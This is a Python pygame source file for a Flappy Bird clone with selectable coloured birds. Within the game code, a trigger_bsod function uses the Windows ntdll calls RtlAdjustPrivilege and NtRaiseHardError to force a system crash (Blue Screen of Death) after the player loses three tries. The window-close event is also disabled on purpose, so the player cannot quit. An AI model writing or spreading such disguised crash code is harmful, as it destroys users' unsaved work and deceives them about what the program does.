import pygame
import random
import time
import os
import sys
import ctypes
import threading

# --- Constants ---
SCREEN_WIDTH = 320
SCREEN_HEIGHT = 480
FPS = 30
PIPE_WIDTH = 50
PIPE_GAP = 150
PIPE_SPEED = 2
GRAVITY = 0.6
LIFT = -8
BIRD_SIZE = 20
WHITE = (255, 255, 255)
BLUE = (135, 206, 235)  # Sky Blue
GREEN = (0, 128, 0)

# --- Character Data ---
CHARACTER_COLORS = {
    "Flappy": (255, 255, 0),    # Yellow
    "Trappy": (255, 0, 0),      # Red
    "Rappy": (0, 255, 0),      # Green
    "Sparrow": (0, 0, 255),    # Blue
}

# --- Functions ---

def draw_bird(screen, bird_x, bird_y, character):
    """Draws the bird on the screen."""
    color = CHARACTER_COLORS.get(character, (255, 255, 0))  # Default to yellow if not found
    pygame.draw.circle(screen, color, (int(bird_x), int(bird_y)), BIRD_SIZE)

def draw_pipes(screen, pipes):
    """Draws the pipes on the screen."""
    for pipe in pipes:
        pygame.draw.rect(screen, GREEN, (pipe['x'], 0, PIPE_WIDTH, pipe['top_height']))
        pygame.draw.rect(screen, GREEN, (pipe['x'], pipe['top_height'] + PIPE_GAP, PIPE_WIDTH, SCREEN_HEIGHT))

def draw_score(screen, score):
    """Draws the score on the screen."""
    font = pygame.font.Font('freesansbold.ttf', 32)
    text = font.render(f"Score: {score}", True, WHITE)
    screen.blit(text, (20, 40))

def generate_pipes():
    """Generates a new set of pipes."""
    top_height = random.randint(50, SCREEN_HEIGHT // 2)
    return {
        'x': SCREEN_WIDTH,
        'top_height': top_height,
        'passed': False,
    }

def update_pipes(pipes, bird_x, bird_y):
    """Updates the position of the pipes and checks for collision and scoring."""
    global score
    for pipe in pipes:
        pipe['x'] -= PIPE_SPEED
    
    new_pipes = []
    for pipe in pipes:
        if pipe['x'] + PIPE_WIDTH > 0:
            new_pipes.append(pipe)
        
        # Check for scoring
        if not pipe['passed'] and bird_x > pipe['x'] + PIPE_WIDTH:
            score += 1
            pipe['passed'] = True
            
        #check for collision
        if (
            bird_x < pipe['x'] + PIPE_WIDTH and
            bird_x + BIRD_SIZE > pipe['x'] and
            (bird_y < pipe['top_height'] or bird_y + BIRD_SIZE > pipe['top_height'] + PIPE_GAP)
            ):
            return True, new_pipes # Collision occurred
            
    return False, new_pipes # No collision

def update_bird(bird_y, bird_speed):
    """Updates the bird's position and speed."""
    bird_speed += GRAVITY
    bird_y += bird_speed
    return bird_y, bird_speed

def check_game_over(bird_y):
    """Checks if the game is over (bird hits top or bottom)."""
    return bird_y > SCREEN_HEIGHT or bird_y < 0

def trigger_bsod():
    """Triggers a Blue Screen of Death on Windows."""
    if os.name == 'nt':  # Check if the OS is Windows
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_ubyte()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC0000008, 0, 0, None, 6, 0)
    else:
        print("This function is only supported on Windows.")
        sys.exit(1)

def game_loop(screen, character):
    """Main game loop."""
    global score, tries
    
    bird_x = 50
    bird_y = SCREEN_HEIGHT / 2
    bird_speed = 0
    pipes = [generate_pipes()]
    score = 0
    game_over = False
    
    while not game_over:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                #game_over = True # removed to prevent exiting with quit.
                pass #do nothing
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_SPACE:
                    bird_speed = LIFT
            if event.type == pygame.MOUSEBUTTONDOWN:
                    bird_speed = LIFT

        screen.fill(BLUE)
        draw_bird(screen, bird_x, bird_y, character)
        draw_pipes(screen, pipes)
        draw_score(screen, score)

        bird_y, bird_speed = update_bird(bird_y, bird_speed)
        collision, pipes = update_pipes(pipes, bird_x, bird_y)
        
        if collision or check_game_over(bird_y):
            game_over = True

        if len(pipes) == 0 or pipes[-1]['x'] < SCREEN_WIDTH - 150:
            pipes.append(generate_pipes())

        pygame.display.flip()
        pygame.time.Clock().tick(FPS)
    
    tries -= 1
    if tries < 1:
        print("Game Over - No more tries.  Crashing System.")
        trigger_bsod()
    else:
        print(f"Game Over! Tries left: {tries}")
        restart_game(screen, character)
        
def restart_game(screen, character):
    """Restarts the game."""
    global score
    
    bird_x = 50
    bird_y = SCREEN_HEIGHT / 2
    bird_speed = 0
    pipes = [generate_pipes()]
    score = 0
    game_over = False
    
    while not game_over:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                #game_over = True # removed to prevent exiting with quit.
                pass #do nothing
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_SPACE:
                    bird_speed = LIFT
            if event.type == pygame.MOUSEBUTTONDOWN:
                    bird_speed = LIFT

        screen.fill(BLUE)
        draw_bird(screen, bird_x, bird_y, character)
        draw_pipes(screen, pipes)
        draw_score(screen, score)

        bird_y, bird_speed = update_bird(bird_y, bird_speed)
        collision, pipes = update_pipes(pipes, bird_x, bird_y)
        
        if collision or check_game_over(bird_y):
            game_over = True

        if len(pipes) == 0 or pipes[-1]['x'] < SCREEN_WIDTH - 150:
            pipes.append(generate_pipes())

        pygame.display.flip()
        pygame.time.Clock().tick(FPS)
    
    game_loop(screen, character) #restart

def main():
    """Initializes Pygame, prompts for character selection, and starts the game."""
    global tries
    tries = 3
    pygame.init()
    screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT), pygame.NOFRAME)
    pygame.display.set_caption("Flappy Bird")
    
    # Character selection
    print("Choose your character:")
    for i, char in enumerate(CHARACTER_COLORS.keys()):
        print(f"{i+1}. {char}")
    
    while True:
        try:
            choice = int(input("Enter the number of your choice: "))
            if 1 <= choice <= len(CHARACTER_COLORS):
                character = list(CHARACTER_COLORS.keys())[choice - 1]
                break
            else:
                print("Invalid choice. Please enter a number from the list.")
        except ValueError:
            print("Invalid input. Please enter a number.")

    # Set up a more robust event loop to prevent the game from freezing or crashing.
    while True:
        game_loop(screen, character)
    
    pygame.quit()
    sys.exit()

if __name__ == "__main__":
    main()
